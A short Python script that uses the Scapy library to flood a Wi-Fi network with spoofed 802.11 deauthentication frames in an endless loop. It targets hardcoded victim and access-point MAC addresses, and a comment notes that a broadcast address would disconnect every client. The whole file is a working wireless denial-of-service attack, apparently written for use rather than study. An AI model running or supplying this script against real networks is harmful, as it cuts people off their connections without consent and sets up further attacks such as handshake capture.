from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


def deauthenticate(victimMAC, APMAC): #use FF:FF:FF:FF:FF:FF for victim to disconnect all clients from AP?
    pkt = RadioTap() / Dot11(addr1=victimMAC, addr2=APMAC, addr3=APMAC) / Dot11Deauth() #RadioTap() is first layer wireless packer, Dot11() Management layer Dot11Deauth() creates deauth frame.
    # pkt1 = RadioTap() / Dot11(addr1=APMAC, addr2=victimMAC, addr3=victimMAC) / Dot11Deauth()
    while (True):
        sendp(pkt, iface="wlp3s0mon")


deauthenticate("7C:11:CB:D6:26:B5", "BC:EE:7B:7E:D9:79")